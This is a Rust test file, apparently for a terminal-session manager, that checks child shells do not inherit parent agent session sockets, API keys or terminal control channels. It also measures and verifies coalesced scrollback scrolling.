        unset_environment: Default::default(),
        program: "/bin/sh".to_owned(),
        arguments: Vec::new(),
        working_directory: PathBuf::from("/"),
        environment,
    }
}

#[test]
fn a_recipe_saved_inside_another_session_does_not_hand_the_child_its_socket() {
    let command = command_from_recipe(&env_recipe(BTreeMap::from([
        ("CLAUDECODE".to_owned(), "1".to_owned()),
        (
            "CLAUDE_CODE_MESSAGING_SOCKET".to_owned(),
            "/run/parent.sock".to_owned(),
        ),
        ("CLAUDE_CODE_SESSION_ID".to_owned(), "parent".to_owned()),
        ("CLAUDE_CONFIG_DIR".to_owned(), "/home/a/.claude".to_owned()),
    ])));
    for name in [
        "CLAUDECODE",
        "CLAUDE_CODE_MESSAGING_SOCKET",
        "CLAUDE_CODE_SESSION_ID",
    ] {
        assert_eq!(command.get_env(name), None, "{name} reached the child");
    }
    assert_eq!(
        command.get_env("CLAUDE_CONFIG_DIR"),
        Some(OsStr::new("/home/a/.claude"))
    );
}

#[test]
fn a_returned_conversation_does_not_hand_the_child_a_parent_session() {
    let mut recipe = env_recipe(BTreeMap::new());
    recipe.unset_environment = ["ANTHROPIC_API_KEY".to_owned()].into();
    let command = command_from_execution(
        &recipe,
        &crate::terminal_ipc::ChatExecutionEnvironment(BTreeMap::from([
            ("CLAUDECODE".to_owned(), "1".to_owned()),
            (
                "CLAUDE_CODE_MESSAGING_SOCKET".to_owned(),
                "/run/parent.sock".to_owned(),
            ),
            ("ANTHROPIC_API_KEY".to_owned(), "removed".to_owned()),
            ("CLAUDE_CONFIG_DIR".to_owned(), "/home/a/.claude".to_owned()),
        ])),
    );
    for name in [
        "CLAUDECODE",
        "CLAUDE_CODE_MESSAGING_SOCKET",
        "ANTHROPIC_API_KEY",
    ] {
        assert_eq!(command.get_env(name), None, "{name} reached the child");
    }
    assert_eq!(
        command.get_env("CLAUDE_CONFIG_DIR"),
        Some(OsStr::new("/home/a/.claude"))
    );
}

#[test]
fn child_environment_advertises_our_own_terminal_identity() {
    let command = command_from_recipe(&env_recipe(BTreeMap::new()));

    assert_eq!(command.get_env("TERM"), Some(OsStr::new("xterm-256color")));
    assert_eq!(command.get_env("COLORTERM"), Some(OsStr::new("truecolor")));
    assert_eq!(command.get_env("TERM_PROGRAM"), Some(OsStr::new("cagents")));
    assert_eq!(
        command.get_env("TERM_PROGRAM_VERSION"),
        Some(OsStr::new(crate::version()))
    );
    // The test below proves the scrub removes names; this one proves
    // `command_from_recipe` still calls it. Only markers this host
    // actually set can witness that, so the assertion is conditional
    // rather than absent: on a host inside kitty or tmux it is real
    // coverage of the call site, and on a bare host it costs nothing.
    for name in INHERITED_TERMINAL_MARKERS {
        if matches!(*name, "TERM_PROGRAM" | "TERM_PROGRAM_VERSION" | "COLORTERM") {
            // Set again, deliberately, after the scrub.
            continue;
        }
        if std::env::var_os(name).is_some() {
            assert_eq!(command.get_env(name), None, "{name} reached the child");
        }
    }
}

#[test]
fn every_inherited_marker_is_dropped_from_the_child_environment() {
    // Planted rather than inherited: `CommandBuilder::new` seeds its map
    // from `std::env::vars_os`, so asserting absence on a fresh command
    // would pass on any host that never set these - which is every host
    // for most of the list, and so would pass with the scrub deleted.
    let mut command = CommandBuilder::new("/bin/sh");
    command.env_clear();
    for name in INHERITED_TERMINAL_MARKERS {
        command.env(name, "planted");
    }
    let sessions = [
        "CLAUDECODE",
        "CLAUDE_CODE_MESSAGING_SOCKET",
        "CODEX_ESCALATE_SOCKET",
    ];
    for name in sessions {
        command.env(name, "planted");
    }
    command.env("CLAUDE_CONFIG_DIR", "/home/a/.claude");

    scrub_inherited_markers(&mut command);

    for name in INHERITED_TERMINAL_MARKERS.iter().chain(&sessions) {
        assert_eq!(command.get_env(name), None, "{name} survived the scrub");
    }
    assert_eq!(
        command.get_env("CLAUDE_CONFIG_DIR"),
        Some(OsStr::new("/home/a/.claude"))
    );
    // Each control channel named as well, so that shortening the list is a
    // test failure and not merely a smaller loop: these reach the user's
    // real kitty instance, multiplexer session, Konsole and editor.
    for channel in [
        "KITTY_LISTEN_ON",
        "TMUX",
        "TMUX_PANE",
        "STY",
        "ZELLIJ",
        "ZELLIJ_SESSION_NAME",
        "ZELLIJ_PANE_ID",
        "KONSOLE_DBUS_SERVICE",
        "KONSOLE_DBUS_SESSION",
        "NVIM",
        "NVIM_LISTEN_ADDRESS",
        "VSCODE_IPC_HOOK_CLI",
        "EMACS_SERVER_FILE",
    ] {
        assert!(
            INHERITED_TERMINAL_MARKERS.contains(&channel),
            "{channel} is not scrubbed"
        );
    }
}

#[test]
fn inherited_color_policy_does_not_disable_or_misidentify_the_pty() {
    let mut command = CommandBuilder::new("/bin/sh");
    command.env_clear();
    for (name, value) in [
        ("NO_COLOR", "1"),
        ("FORCE_COLOR", "0"),
        ("CLICOLOR", "0"),
        ("CLICOLOR_FORCE", "1"),
        ("COLORFGBG", "0;15"),
    ] {
        command.env(name, value);
    }
    scrub_inherited_markers(&mut command);
    for name in [
        "NO_COLOR",
        "FORCE_COLOR",
        "CLICOLOR",
        "CLICOLOR_FORCE",
        "COLORFGBG",
    ] {
        assert_eq!(command.get_env(name), None, "{name} reached the PTY");
    }
}

#[test]
fn explicit_recipe_environment_overrides_terminal_defaults() {
    let command = command_from_recipe(&env_recipe(BTreeMap::from([
        ("TERM".to_owned(), "dumb".to_owned()),
        ("KITTY_WINDOW_ID".to_owned(), "3".to_owned()),
        ("NO_COLOR".to_owned(), "1".to_owned()),
        ("FORCE_COLOR".to_owned(), "0".to_owned()),
        ("CLICOLOR".to_owned(), "0".to_owned()),
        ("CLICOLOR_FORCE".to_owned(), "1".to_owned()),
        ("COLORFGBG".to_owned(), "0;15".to_owned()),
        ("COLORTERM".to_owned(), "24bit".to_owned()),
    ])));

    assert_eq!(command.get_env("TERM"), Some(OsStr::new("dumb")));
    assert_eq!(command.get_env("KITTY_WINDOW_ID"), Some(OsStr::new("3")));
    assert_eq!(command.get_env("COLORTERM"), Some(OsStr::new("24bit")));
    assert_eq!(command.get_env("NO_COLOR"), Some(OsStr::new("1")));
    assert_eq!(command.get_env("FORCE_COLOR"), Some(OsStr::new("0")));
    assert_eq!(command.get_env("CLICOLOR"), Some(OsStr::new("0")));
    assert_eq!(command.get_env("CLICOLOR_FORCE"), Some(OsStr::new("1")));
    assert_eq!(command.get_env("COLORFGBG"), Some(OsStr::new("0;15")));
}

#[test]
fn removed_managed_home_cannot_relaunch_from_final_pty_environment() {
    const CHILD: &str = "CAGENTS_REMOVED_ACCOUNT_PTY_TEST";
    if std::env::var_os(CHILD).is_none() {
        let directory = tempfile::tempdir().unwrap();
        for mode in ["inherited", "returned"] {
            assert!(std::process::Command::new(std::env::current_exe().unwrap())
                .args(["--exact", "terminal::worker::tests::removed_managed_home_cannot_relaunch_from_final_pty_environment", "--nocapture"])
                .env_clear().env(CHILD, mode).env("HOME", directory.path())
                // The child names its storage as this process does.
                .envs(std::env::var_os(crate::instance::DEVELOPMENT_INSTANCE_ENV)
                    .map(|instance| (crate::instance::DEVELOPMENT_INSTANCE_ENV, instance)))
                .env("XDG_DATA_HOME", directory.path().join("data"))
                .env("PATH", "/usr/bin:/bin")
                .env("CODEX_HOME", directory.path().join("data").join(crate::instance::storage_name()).join("accounts/codex/12345678-1234-4234-8234-123456789abc"))
                .status().unwrap().success());
        }
        return;
    }
    let homes = crate::account::home::Homes::installation().unwrap();
    let home = homes.path(
        crate::agent::Provider::Codex,
        uuid::Uuid::parse_str("12345678-1234-4234-8234-123456789abc").unwrap(),
    );
    // The child would recreate this absent home if authorization accidentally
    // inspected only the durable recipe rather than the actual launch.
    let mut recipe = env_recipe(BTreeMap::new());
    recipe.arguments = vec!["-c".into(), "mkdir -p \"$CODEX_HOME\"".into()];
    let returned = std::env::var(CHILD).unwrap() == "returned";
    let config = TerminalConfig {
        execution_environment: returned.then(|| {
            crate::terminal_ipc::ChatExecutionEnvironment(BTreeMap::from([(
                "CODEX_HOME".into(),
                home.to_str().unwrap().into(),
            )]))
        }),
        ..TerminalConfig::default()
    };
    let session = TerminalSession {
        owned_codex_listener: None,
        recovery_origin: None,
        predecessor: None,
        id: crate::model::TerminalId::new(),
        launch: recipe.clone(),
        transcript_path: None,
        resume_hint: None,
        continuity: crate::model::TerminalContinuity::RelaunchAvailable {
            recipe,
            last_exit: None,
        },
    };
    let (_tx, commands) = command_channel(1);
    let (events, _receiver) = crossbeam_channel::unbounded();
    let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
    let failure = Worker::start(session, config, None, commands, events, published)
        .err()
        .expect("removed account blocks PTY creation");
    assert!(failure.contains("removed"), "{failure}");
    assert!(
        !home.exists(),
        "the CLI must never recreate the removed home"
    );
}

#[test]
fn selected_account_removals_win_in_fresh_and_returned_pty_children() {
    let directory = tempfile::tempdir().unwrap();
    for returned in [false, true] {
        let mut recipe = env_recipe(BTreeMap::from([
            ("CODEX_API_KEY".into(), "fixture-key".into()),
            ("CODEX_HOME".into(), "/selected".into()),
        ]));
        recipe.working_directory = directory.path().into();
        recipe.unset_environment.insert("CODEX_API_KEY".into());
        recipe.arguments = vec![
            "-c".into(),
            "[ -z \"${CODEX_API_KEY+x}\" ] && [ \"$CODEX_HOME\" = /selected ] && : > isolated"
                .into(),
        ];
        let config = TerminalConfig {
            execution_environment: returned
                .then(|| crate::terminal_ipc::ChatExecutionEnvironment(recipe.environment.clone())),
            ..TerminalConfig::default()
        };
        let (worker, _) = capture_worker_with(recipe, config);
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        while !directory.path().join("isolated").exists() {
            assert!(
                std::time::Instant::now() < deadline,
                "PTY did not enforce selected account environment"
            );
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        worker.run();
        std::fs::remove_file(directory.path().join("isolated")).unwrap();
    }
}

/// A shell in a development instance runs `cagents` against that
/// instance's daemon, whatever environment it was handed; outside one it
/// never inherits a stale instance.
#[test]
fn terminals_keep_their_development_instance_and_only_theirs() {
    const CHILD: &str = "CAGENTS_TERMINAL_INSTANCE_TEST";
    const NAME: &str = "probe";
    let test = "terminal::worker::tests::terminals_keep_their_development_instance_and_only_theirs";
    let Some(expected) = std::env::var_os(CHILD) else {
        let directory = tempfile::tempdir().unwrap();
        for instance in [Some(NAME), None] {
            let mut child = std::process::Command::new(std::env::current_exe().unwrap());
            child
                .args(["--exact", test, "--nocapture"])
                .env_clear()
                .env(CHILD, instance.unwrap_or("unset"))
                .env("HOME", directory.path())
                .env("PATH", "/usr/bin:/bin")
                .envs(std::env::var_os("TMPDIR").map(|tmp| ("TMPDIR", tmp)));
            if let Some(instance) = instance {
                child.env(crate::instance::DEVELOPMENT_INSTANCE_ENV, instance);
            }
            assert!(child.status().unwrap().success(), "{instance:?}");
        }
        return;
    };
    let directory = tempfile::tempdir().unwrap();
    for returned in [false, true] {
        let mut recipe = env_recipe(BTreeMap::new());
        recipe.working_directory = directory.path().into();
        recipe.arguments = vec![
            "-c".into(),
            "printf %s \"${CAGENTS_DEVELOPMENT_INSTANCE-unset}\" > seen.tmp && mv seen.tmp seen"
                .into(),
        ];
        // An environment handed back from a chat may carry another value.
        let config = TerminalConfig {
            execution_environment: returned.then(|| {
                crate::terminal_ipc::ChatExecutionEnvironment(BTreeMap::from([
                    ("PATH".into(), "/usr/bin:/bin".into()),
                    (
                        crate::instance::DEVELOPMENT_INSTANCE_ENV.into(),
                        "stale".into(),
                    ),
                ]))
            }),
            ..TerminalConfig::default()
        };
        let (worker, _) = capture_worker_with(recipe, config);
        let seen = directory.path().join("seen");
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        while !seen.exists() {
            assert!(
                std::time::Instant::now() < deadline,
                "the shell never reported"
            );
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        worker.run();
        assert_eq!(
            std::fs::read_to_string(&seen).unwrap(),
            expected.to_str().unwrap(),
            "returned: {returned}"
        );
        std::fs::remove_file(&seen).unwrap();
    }
}

const SCROLLBACK_LINES: usize = 2000;
/// A 0.67s flick at 60 Hz presentation.
const FRAMES: usize = 40;
/// What a 120 Hz high-resolution trackpad delivers inside one 60 Hz frame,
/// which is the situation issue #101 is about.
const NOTCHES_PER_FRAME: usize = 8;
const LINES_PER_NOTCH: isize = 3;

/// One measured scroll run: what the pipeline actually did, what it cost,
/// where it started and where it ended up.
#[derive(Debug)]
struct ScrollRun {
    commands: usize,
    captures: usize,
    wire_bytes: usize,
    origin: (u64, String),
    offset: u64,
    screen: String,
    latency: crate::performance::LatencySummary,
}

/// Applies `deltas` to a filled scrollback, driving every command through
/// the viewport re-read, the snapshot capture and the wire encoding the
/// daemon would have performed for it.
fn scroll_run(deltas: impl IntoIterator<Item = isize>) -> ScrollRun {
    use crate::performance::{Action, Recorder};
    use crate::terminal::ipc::{TerminalSnapshot, write_frame};
    use std::time::Instant;

    // libghostty sizes scrollback from its own page pool rather than from
    // a row count, so the pool is asked for generously and the workload
    // then checks that it never reached a bound by accident.
    let (mut worker, _events) = capture_worker_with(
        LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/true".into(),
            arguments: Vec::new(),
            working_directory: PathBuf::from("/"),
            environment: BTreeMap::new(),
        },
        TerminalConfig {
            max_scrollback_bytes: 4_000_000,
            ..TerminalConfig::default()
        },
    );
    // A deterministic 80-column history, wide enough that a viewport
    // re-read and its wire encoding both do realistic per-cell work.
    let mut history = Vec::with_capacity(SCROLLBACK_LINES * 80);
    for line in 0..SCROLLBACK_LINES {
        history.extend_from_slice(format!("{line:<78}\r\n").as_bytes());
    }
    worker.process_output(history);

    let screen = |snapshot: &RenderSnapshot| {
        snapshot
            .lines
            .iter()
            .map(|line| {
                line.cells
                    .iter()
                    .map(|cell| cell.text.as_str())
                    .collect::<String>()
            })
            .collect::<Vec<_>>()
            .join("\n")
    };
    let mut recorder = Recorder::default();
    let mut previous = worker.published.snapshot.load_full();
    let origin = (previous.scroll.offset, screen(&previous));
    let mut commands = 0;
    let mut captures = 0;
    let mut wire_bytes = 0;
    for delta in deltas {
        // Returning credit first is what the UI does after drawing, so the
        // worker is free to capture the command that follows.
        worker.published.acknowledge(worker.generation);
        let generation = recorder.commit(Action::TerminalScroll).unwrap();
        assert!(
            !worker.handle_command(Command::Scroll(ScrollCommand::Delta(delta))),
            "a scroll command must not request shutdown"
        );
        let published = worker.published.snapshot.load_full();
        if published.generation != previous.generation {
            captures += 1;
            let mut frame = Vec::new();
            write_frame(&mut frame, &TerminalSnapshot::diff(&published, &previous)).unwrap();
            wire_bytes += frame.len();
        }
        assert!(recorder.redraw_scheduled(generation, Instant::now()));
        previous = published;
        commands += 1;
    }

    let mut durations: Vec<_> = recorder
        .samples()
        .filter_map(|sample| sample.redraw_scheduling_ns.map(Duration::from_nanos))
        .collect();
    ScrollRun {
        commands,
        captures,
        wire_bytes,
        origin,
        offset: previous.scroll.offset,
        screen: screen(&previous),
        latency: crate::performance::LatencySummary::from_durations(&mut durations).unwrap(),
    }
}

/// Deterministic scroll workload for issue #101, plus the equivalence that
/// makes coalescing safe.
///
/// The widget lives in the `ui` feature graph and the emulator in `host`,
/// so no single build can drive a wheel gesture end to end. This half
/// measures the expensive half of the pipeline - applying a viewport move
/// to ghostty, re-reading the viewport into a snapshot, and encoding that
/// snapshot for the socket - and proves that folding a frame's notches
/// into one command lands on exactly the same screen. The folding itself
/// is covered by `terminal::widget::tests`.
///
/// Timings are printed, never asserted: a `test`-profile build with an
/// unoptimized parser gives a ratio, not a latency budget, and this crate
/// treats even release numbers as non-gating.
#[test]
fn coalescing_a_frame_of_notches_costs_one_capture_and_lands_on_the_same_screen() {
    let notches = FRAMES * NOTCHES_PER_FRAME;
    let per_event = scroll_run(std::iter::repeat_n(-LINES_PER_NOTCH, notches));
    let per_frame = scroll_run(std::iter::repeat_n(
        -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
        FRAMES,
    ));

    // The whole point: the same gesture reaches the same place, showing
    // the same rows, for an eighth of the commands and captures.
    assert_eq!(per_frame.offset, per_event.offset);
    assert_eq!(per_frame.screen, per_event.screen);
    assert_eq!(per_event.captures, notches);
    assert_eq!(per_frame.captures, FRAMES);
    // A run that clamped at the top would satisfy the equality above
    // without having measured scrolling at all.
    assert!(
        per_event.offset > 0,
        "the workload must stay inside scrollback rather than clamp"
    );

    let budget = crate::performance::PerformanceBudget {
        // One coalesced move has to fit inside a 60 Hz frame alongside the
        // rest of that frame's work, so a quarter of a frame at p95.
        interaction_p95: Duration::from_micros(4_166),
        interaction_p99: Duration::from_micros(8_333),
        ..crate::performance::PerformanceBudget::default()
    };
    for (policy, run) in [("per-event", &per_event), ("per-frame", &per_frame)] {
        println!(
            "scroll workload [{policy}] commands={} captures={} wire_bytes={} \
                 p50={:?} p95={:?} p99={:?} worst={:?} within_budget={} (non-gating)",
            run.commands,
            run.captures,
            run.wire_bytes,
            run.latency.median,
            run.latency.p95,
            run.latency.p99,
            run.latency.worst,
            budget.accepts(run.latency)
        );
    }
    println!(
        "scroll workload [saving] commands x{:.2} wire_bytes x{:.2} total_capture_time \
             {:?} -> {:?}",
        per_event.commands as f64 / per_frame.commands as f64,
        per_event.wire_bytes as f64 / per_frame.wire_bytes as f64,
        per_event.latency.median * per_event.commands as u32,
        per_frame.latency.median * per_frame.commands as u32
    );
}

/// Folding must not change where a gesture stops, which is the one place
/// a summed delta could plausibly differ from the notches it replaced.
#[test]
fn overshooting_either_bound_clamps_the_same_whether_or_not_it_was_coalesced() {
    let overshoot = SCROLLBACK_LINES as isize * 2;
    let notches = (overshoot / LINES_PER_NOTCH) as usize;

    let top_per_event = scroll_run(std::iter::repeat_n(-LINES_PER_NOTCH, notches));
    let top_per_frame = scroll_run(std::iter::repeat_n(
        -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
        notches / NOTCHES_PER_FRAME,
    ));
    assert_eq!(top_per_event.offset, 0, "the top of scrollback is row zero");
    assert_eq!(top_per_frame.offset, 0);
    assert_eq!(top_per_frame.screen, top_per_event.screen);

    // Coming back down has to land on the live screen again, not one row
    // short of it or past the end of history.
    let bottom_per_event = scroll_run(
        std::iter::repeat_n(-LINES_PER_NOTCH, notches)
            .chain(std::iter::repeat_n(LINES_PER_NOTCH, notches)),
    );
    let bottom_per_frame = scroll_run(
        std::iter::repeat_n(
            -LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
            notches / NOTCHES_PER_FRAME,
        )
        .chain(std::iter::repeat_n(
            LINES_PER_NOTCH * NOTCHES_PER_FRAME as isize,
            notches / NOTCHES_PER_FRAME,
        )),
    );
    assert_eq!(bottom_per_frame.offset, bottom_per_event.offset);
    assert_eq!(bottom_per_frame.screen, bottom_per_event.screen);
    assert_eq!(
        (bottom_per_event.offset, &bottom_per_event.screen),
        (bottom_per_event.origin.0, &bottom_per_event.origin.1),
        "returning to the bottom must show the live screen again"
    );
}
